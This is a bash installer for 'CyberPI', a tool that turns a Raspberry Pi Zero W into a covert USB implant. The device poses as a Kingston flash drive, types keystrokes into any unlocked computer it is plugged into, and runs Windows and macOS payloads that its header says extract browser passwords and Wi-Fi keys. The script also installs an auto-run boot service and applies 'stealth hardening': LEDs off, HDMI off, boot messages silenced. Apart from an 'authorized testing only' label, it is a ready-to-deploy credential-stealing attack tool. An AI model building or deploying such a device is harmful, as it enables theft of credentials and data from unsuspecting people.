#!/bin/bash
# ============================================================================
#  CyberPI — One-Command Installer (Hackathon Edition)
#
#  Run this ONCE on a fresh Raspberry Pi Zero W with Raspberry Pi OS Lite:
#
#     sudo bash hackathon/install.sh
#
#  After reboot, the Pi is ready.  Plug it into ANY unlocked computer
#  and it will automatically:
#    1. Present itself as a USB flash drive + keyboard
#    2. Detect the target OS
#    3. Open a hidden terminal
#    4. Extract browser passwords, Wi-Fi keys, system info
#    5. Encrypt everything
#    6. Blink the LED when done
#
#  Author: Mr.D137
#  License: MIT — Authorized Testing Only
# ============================================================================

set -euo pipefail

# ─── Constants ───────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
MOUNT_POINT="/mnt/usb_share"
USB_IMAGE="/piusb.bin"
USB_SIZE_MB=512                          # 512 MB — enough for collected data
INSTALL_DIR="/opt/cyberpi"               # Where we install permanently
LOG="$INSTALL_DIR/install.log"

# Colors
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'; N='\033[0m'
ok()   { echo -e "${G}[✓]${N} $*"; }
info() { echo -e "${B}[·]${N} $*"; }
warn() { echo -e "${Y}[!]${N} $*"; }
fail() { echo -e "${R}[✗]${N} $*" >&2; exit 1; }

# ─── Pre-flight checks ──────────────────────────────────
[[ $EUID -eq 0 ]] || fail "Run as root:  sudo bash $0"

echo -e "${R}${Y}"
cat << 'ART'
   ___      _              ___ ___
  / __\   _| |__   ___ _ _| _ \_ _|
 | |  | | | | '_ \ / _ \ '_|  _/| |
 | |__| |_| | |_) |  __/ | | | | |
  \____\__, |_.__/ \___|_| |_| |___|
       |___/
ART
echo -e "${N}"
echo -e "${Y}  One-command installer — Hackathon Edition${N}"
echo -e "${R}  AUTHORIZED PENETRATION TESTING ONLY${N}"
echo ""

# ─── Step 1: System update & deps ────────────────────────
info "Step 1/8: Installing system packages..."
apt-get update -qq
apt-get install -y -qq \
    python3 python3-pip python3-venv \
    git dosfstools exfat-fuse exfat-utils \
    build-essential libffi-dev libssl-dev \
    > /dev/null 2>&1
ok "System packages installed"

# ─── Step 2: Install project ────────────────────────────
info "Step 2/8: Installing CyberPI to $INSTALL_DIR..."
mkdir -p "$INSTALL_DIR"

# Copy project files
cp -r "$PROJECT_ROOT/src"       "$INSTALL_DIR/src"
cp -r "$SCRIPT_DIR"/*           "$INSTALL_DIR/hackathon/" 2>/dev/null || true
mkdir -p "$INSTALL_DIR/hackathon/payloads"
cp "$SCRIPT_DIR/auto_attack_v2.py"                   "$INSTALL_DIR/hackathon/"
cp "$SCRIPT_DIR/viewer.py"                           "$INSTALL_DIR/hackathon/"
cp "$SCRIPT_DIR/payloads/windows_payload_v2.ps1"     "$INSTALL_DIR/hackathon/payloads/"
cp "$SCRIPT_DIR/payloads/macos_payload_v2.sh"        "$INSTALL_DIR/hackathon/payloads/"
chmod +x "$INSTALL_DIR/hackathon/payloads/macos_payload_v2.sh"

# Python venv
python3 -m venv "$INSTALL_DIR/venv"
"$INSTALL_DIR/venv/bin/pip" install -q pycryptodomex 2>/dev/null
ok "Project installed to $INSTALL_DIR"

# ─── Step 3: Configure boot for USB gadget ───────────────
info "Step 3/8: Configuring boot for USB gadget mode..."

# /boot/config.txt — enable dwc2 overlay
BOOT_CONFIG="/boot/config.txt"
[[ -f "/boot/firmware/config.txt" ]] && BOOT_CONFIG="/boot/firmware/config.txt"

if ! grep -q "dtoverlay=dwc2" "$BOOT_CONFIG" 2>/dev/null; then
    cat >> "$BOOT_CONFIG" << 'EOF'

# CyberPI USB gadget
dtoverlay=dwc2,dr_mode=peripheral
gpu_mem=16
disable_splash=1
EOF
    ok "Updated $BOOT_CONFIG"
else
    ok "$BOOT_CONFIG already configured"
fi

# /boot/cmdline.txt — add modules-load=dwc2 after rootwait
CMDLINE="/boot/cmdline.txt"
[[ -f "/boot/firmware/cmdline.txt" ]] && CMDLINE="/boot/firmware/cmdline.txt"

if ! grep -q "modules-load=dwc2" "$CMDLINE" 2>/dev/null; then
    sed -i 's/rootwait/rootwait modules-load=dwc2/' "$CMDLINE"
    ok "Updated $CMDLINE"
fi

# /etc/modules — ensure dwc2 and libcomposite load
for mod in dwc2 libcomposite; do
    grep -q "^${mod}$" /etc/modules 2>/dev/null || echo "$mod" >> /etc/modules
done
ok "Kernel modules configured"

# ─── Step 4: Create USB disk image ──────────────────────
info "Step 4/8: Creating ${USB_SIZE_MB}MB virtual USB drive..."

if [[ ! -f "$USB_IMAGE" ]]; then
    dd if=/dev/zero of="$USB_IMAGE" bs=1M count="$USB_SIZE_MB" status=progress 2>&1
    mkfs.vfat -F 32 -n "TRUSTED" "$USB_IMAGE"
    ok "Created FAT32 image: $USB_IMAGE"
else
    ok "USB image already exists"
fi

# Mount it
mkdir -p "$MOUNT_POINT"
if ! mountpoint -q "$MOUNT_POINT" 2>/dev/null; then
    mount -o loop "$USB_IMAGE" "$MOUNT_POINT"
fi

# fstab entry for auto-mount
if ! grep -q "$USB_IMAGE" /etc/fstab 2>/dev/null; then
    echo "$USB_IMAGE $MOUNT_POINT vfat loop,defaults,nofail 0 0" >> /etc/fstab
fi
ok "USB drive mounted at $MOUNT_POINT"

# ─── Step 5: Deploy payloads to USB image ────────────────
info "Step 5/8: Deploying payloads to USB drive..."

# Copy v2 payloads
cp "$INSTALL_DIR/hackathon/payloads/windows_payload_v2.ps1" \
   "$MOUNT_POINT/windows_payload.ps1"
cp "$INSTALL_DIR/hackathon/payloads/macos_payload_v2.sh" \
   "$MOUNT_POINT/macos_payload.sh"
chmod +x "$MOUNT_POINT/macos_payload.sh"

# Keyboard layout hint (default US — change to fr/de if needed)
echo "us" > "$MOUNT_POINT/.kb_layout"

ok "Payloads deployed to $MOUNT_POINT"

# ─── Step 6: Install the USB gadget setup script ────────
info "Step 6/8: Installing USB composite gadget script..."

cat > /usr/local/bin/cyberpi-gadget << 'GADGET'
#!/bin/bash
# CyberPI — USB Composite Gadget Setup
# Creates: HID keyboard (/dev/hidg0) + mass storage (USB flash drive)
set -euo pipefail

GADGET_DIR="/sys/kernel/config/usb_gadget/cyberpi"
USB_IMAGE="/piusb.bin"
MOUNT_POINT="/mnt/usb_share"

teardown() {
    [[ -d "$GADGET_DIR" ]] || return 0
    echo "" > "$GADGET_DIR/UDC" 2>/dev/null || true
    for link in "$GADGET_DIR"/configs/*/hid.usb0 "$GADGET_DIR"/configs/*/mass_storage.usb0; do
        [[ -L "$link" ]] && rm -f "$link"
    done
    for d in "$GADGET_DIR"/configs/*/strings/0x0409 "$GADGET_DIR"/strings/0x0409; do
        [[ -d "$d" ]] && rmdir "$d" 2>/dev/null || true
    done
    for d in "$GADGET_DIR"/configs/*; do [[ -d "$d" ]] && rmdir "$d" 2>/dev/null || true; done
    for d in "$GADGET_DIR"/functions/*; do [[ -d "$d" ]] && rmdir "$d" 2>/dev/null || true; done
    [[ -d "$GADGET_DIR" ]] && rmdir "$GADGET_DIR" 2>/dev/null || true
}

setup() {
    modprobe libcomposite 2>/dev/null || true
    modprobe dwc2         2>/dev/null || true

    [[ -d "$GADGET_DIR" ]] && teardown

    # Mount image if needed
    mkdir -p "$MOUNT_POINT"
    mountpoint -q "$MOUNT_POINT" 2>/dev/null || mount -o loop "$USB_IMAGE" "$MOUNT_POINT" || true

    # Unmount loopback before giving it to mass_storage
    # (mass_storage needs exclusive access to the image file)
    umount "$MOUNT_POINT" 2>/dev/null || true

    mkdir -p "$GADGET_DIR"

    # Identifiers — looks like a generic flash drive
    echo "0x0951" > "$GADGET_DIR/idVendor"    # Kingston Technology
    echo "0x1666" > "$GADGET_DIR/idProduct"   # DataTraveler
    echo "0x0100" > "$GADGET_DIR/bcdDevice"
    echo "0x0200" > "$GADGET_DIR/bcdUSB"

    mkdir -p "$GADGET_DIR/strings/0x0409"
    echo "012345678901"   > "$GADGET_DIR/strings/0x0409/serialnumber"
    echo "Kingston"       > "$GADGET_DIR/strings/0x0409/manufacturer"
    echo "DataTraveler"   > "$GADGET_DIR/strings/0x0409/product"

    # HID keyboard
    mkdir -p "$GADGET_DIR/functions/hid.usb0"
    echo 1 > "$GADGET_DIR/functions/hid.usb0/protocol"
    echo 1 > "$GADGET_DIR/functions/hid.usb0/subclass"
    echo 8 > "$GADGET_DIR/functions/hid.usb0/report_length"
    echo -ne '\x05\x01\x09\x06\xa1\x01\x05\x07\x19\xe0\x29\xe7\x15\x00\x25\x01\x75\x01\x95\x08\x81\x02\x95\x01\x75\x08\x81\x03\x95\x05\x75\x01\x05\x08\x19\x01\x29\x05\x91\x02\x95\x01\x75\x03\x91\x03\x95\x06\x75\x08\x15\x00\x25\x65\x05\x07\x19\x00\x29\x65\x81\x00\xc0' \
        > "$GADGET_DIR/functions/hid.usb0/report_desc"

    # Mass storage
    mkdir -p "$GADGET_DIR/functions/mass_storage.usb0/lun.0"
    echo 1              > "$GADGET_DIR/functions/mass_storage.usb0/stall"
    echo 0              > "$GADGET_DIR/functions/mass_storage.usb0/lun.0/cdrom"
    echo 0              > "$GADGET_DIR/functions/mass_storage.usb0/lun.0/ro"
    echo 0              > "$GADGET_DIR/functions/mass_storage.usb0/lun.0/nofua"
    echo "$USB_IMAGE"   > "$GADGET_DIR/functions/mass_storage.usb0/lun.0/file"

    # Bind
    mkdir -p "$GADGET_DIR/configs/c.1/strings/0x0409"
    echo "DataTraveler" > "$GADGET_DIR/configs/c.1/strings/0x0409/configuration"
    echo 250            > "$GADGET_DIR/configs/c.1/MaxPower"

    ln -sf "$GADGET_DIR/functions/hid.usb0"          "$GADGET_DIR/configs/c.1/"
    ln -sf "$GADGET_DIR/functions/mass_storage.usb0"  "$GADGET_DIR/configs/c.1/"

    # Enable
    local udc
    udc=$(ls /sys/class/udc/ 2>/dev/null | head -1)
    [[ -z "$udc" ]] && { echo "No UDC found!"; exit 1; }
    echo "$udc" > "$GADGET_DIR/UDC"

    echo "Gadget active: HID=/dev/hidg0  Storage=$USB_IMAGE"
}

case "${1:-setup}" in
    setup)    setup    ;;
    teardown) teardown ;;
    *)        echo "Usage: $0 [setup|teardown]" ;;
esac
GADGET
chmod +x /usr/local/bin/cyberpi-gadget
ok "Gadget script installed"

# ─── Step 7: Install the payload runner + systemd ────────
info "Step 7/8: Installing auto-run service..."

# The payload runner — uses Python v2 attack engine
cat > /usr/local/bin/cyberpi-run << 'RUNNER'
#!/bin/bash
# ============================================================================
#  CyberPI Auto-Run — called by systemd on boot
#
#  Flow:
#    1. cyberpi-gadget creates HID+storage USB device
#    2. This script waits for host enumeration
#    3. Launches auto_attack_v2.py which handles:
#       - OS detection (multi-signal, polling)
#       - Screen-lock check (canary file)
#       - HID keyboard injection (layout-aware)
#       - Adaptive wait for payload completion
#       - AES-256 encryption of results
#       - LED signalling
# ============================================================================
set -uo pipefail

INSTALL_DIR="/opt/cyberpi"
MOUNT_POINT="/mnt/usb_share"
LOG="/var/log/cyberpi.log"
PYTHON="$INSTALL_DIR/venv/bin/python3"
ATTACK="$INSTALL_DIR/hackathon/auto_attack_v2.py"

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG"; }

log "=== CyberPI STARTED ==="

# 1. Set up gadget
log "Setting up USB gadget..."
/usr/local/bin/cyberpi-gadget setup >> "$LOG" 2>&1

# 2. Wait for /dev/hidg0 to appear
for i in $(seq 1 30); do
    [[ -c /dev/hidg0 ]] && break
    sleep 0.5
done

if [[ ! -c /dev/hidg0 ]]; then
    log "ERROR: /dev/hidg0 never appeared — aborting"
    exit 1
fi
log "HID device ready: /dev/hidg0"

# 3. Small extra delay for host to enumerate
sleep 2

# 4. Re-mount the image so our Python code can read the layout hint
#    (gadget unmounted it to give mass_storage exclusive access,
#     but we can mount it read-only while mass_storage has it)
mkdir -p "$MOUNT_POINT"
mount -o loop,ro /piusb.bin "$MOUNT_POINT" 2>/dev/null || true

# 5. Run the v2 attack engine
log "Launching attack engine..."
export PYTHONPATH="$INSTALL_DIR/src:$INSTALL_DIR:$INSTALL_DIR/hackathon"

"$PYTHON" "$ATTACK" \
    --mount "$MOUNT_POINT" \
    --hid /dev/hidg0 \
    --layout auto \
    --wait-enum 4 \
    --os-timeout 12 \
    --payload-timeout 90 \
    >> "$LOG" 2>&1

EXIT_CODE=$?
log "Attack engine exited with code $EXIT_CODE"
log "=== CyberPI COMPLETED ==="
RUNNER
chmod +x /usr/local/bin/cyberpi-run

# systemd service — starts automatically on boot
cat > /etc/systemd/system/cyberpi.service << 'SVC'
[Unit]
Description=CyberPI Auto-Attack
After=local-fs.target
DefaultDependencies=no
# Start as soon as possible — no network needed

[Service]
Type=oneshot
ExecStart=/usr/local/bin/cyberpi-run
RemainAfterExit=yes
StandardOutput=journal
StandardError=journal
Environment=PYTHONUNBUFFERED=1

# Hardening — don't let crashes reveal us
Restart=no
TimeoutStartSec=120

[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable cyberpi.service
ok "Auto-run service installed and enabled"

# ─── Step 8: Stealth hardening ──────────────────────────
info "Step 8/8: Applying stealth hardening..."

# Disable activity LED (green blink on Pi)
if [[ -f /sys/class/leds/ACT/trigger ]]; then
    echo none > /sys/class/leds/ACT/trigger 2>/dev/null || true
    echo 0    > /sys/class/leds/ACT/brightness 2>/dev/null || true
fi

# Make the LED stay off at boot
cat > /etc/rc.local << 'RCLOCAL'
#!/bin/bash
# Disable Pi LEDs for stealth
echo none > /sys/class/leds/ACT/trigger 2>/dev/null || true
echo 0    > /sys/class/leds/ACT/brightness 2>/dev/null || true
# Also the PWR LED on some models
echo none > /sys/class/leds/PWR/trigger 2>/dev/null || true
echo 0    > /sys/class/leds/PWR/brightness 2>/dev/null || true
exit 0
RCLOCAL
chmod +x /etc/rc.local

# Disable unnecessary services
for svc in bluetooth hciuart avahi-daemon triggerhappy; do
    systemctl disable "$svc" 2>/dev/null || true
    systemctl mask    "$svc" 2>/dev/null || true
done

# Disable HDMI (saves power, reduces side-channel)
command -v tvservice &>/dev/null && tvservice -o 2>/dev/null || true

# Reduce boot messages
if [[ -f "$CMDLINE" ]]; then
    grep -q "quiet" "$CMDLINE" || sed -i 's/rootwait/rootwait quiet loglevel=0/' "$CMDLINE"
fi

ok "Stealth hardening applied"

# ─── Done ────────────────────────────────────────────────
echo ""
echo -e "${G}════════════════════════════════════════════════════════${N}"
echo -e "${G}       CYBERPI INSTALLATION COMPLETE${N}"
echo -e "${G}════════════════════════════════════════════════════════${N}"
echo ""
echo -e "  ${Y}Reboot now:${N}  sudo reboot"
echo ""
echo -e "  After reboot, the Pi will:"
echo -e "    1. Create USB gadget automatically"
echo -e "    2. Wait to be plugged into a target"
echo -e "    3. Detect OS → inject keystrokes → run payload"
echo -e "    4. Encrypt all data → blink LED → done"
echo ""
echo -e "  ${B}To view results:${N}"
echo -e "    SSH into the Pi and run:"
echo -e "    sudo mount -o loop /piusb.bin /mnt/usb_share"
echo -e "    $INSTALL_DIR/venv/bin/python3 $INSTALL_DIR/hackathon/viewer.py /mnt/usb_share"
echo ""
echo -e "  ${Y}To change keyboard layout:${N}"
echo -e "    Edit /mnt/usb_share/.kb_layout  (us / fr / de)"
echo ""
echo -e "  ${R}AUTHORIZED TESTING ONLY${N}"
echo ""
